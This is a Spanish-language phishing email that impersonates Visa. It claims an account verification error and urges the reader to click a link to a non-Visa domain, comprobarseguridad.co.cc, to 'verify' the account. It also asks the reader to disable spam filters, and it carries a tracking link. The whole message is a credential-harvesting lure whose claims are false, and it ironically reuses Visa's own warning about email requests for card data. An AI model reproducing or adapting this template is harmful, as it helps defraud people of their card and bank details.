 Estimado cliente visa nuestro sistema informático de verifiación ha encontrado un error a la hora de cotejar los datos en nuestra base bancaria. La información de su cuenta ha cambiado o está incompleta. Por favor haga click en el enlace abajo mostrado para verificar que todo está en orden y asi evitar futuros errores o perdida de datos. En caso de tratarse de un error interno, una actualización automática tendrá lugar de forma instantanea. Puede verificar su cuenta haciendo click sobre el siguiente enlace: http://www.comprobarseguridad.co.cc nota:este mail es enviado automaticamente por favor no lo responda,debido a posibles filtros en su casilla puede que el mismo figure como spam,para una correcta visualizacion deshabilite todos sus filtros si ya ha recibido este mensaje sepa disculpar las molestias gracias. © Le recordamos que visa.com no envía correos electrónicos solicitando información confidencial. Por favor nunca ponga los datos de su tarjeta visa en un mail,verifique que la direccion de envio siempre sea @visa.com Copyright 2010, Visa.com. All rights reserved. http://panel.fangionews.com/u.php?p=15r/rs/hhj/tz/155/rs 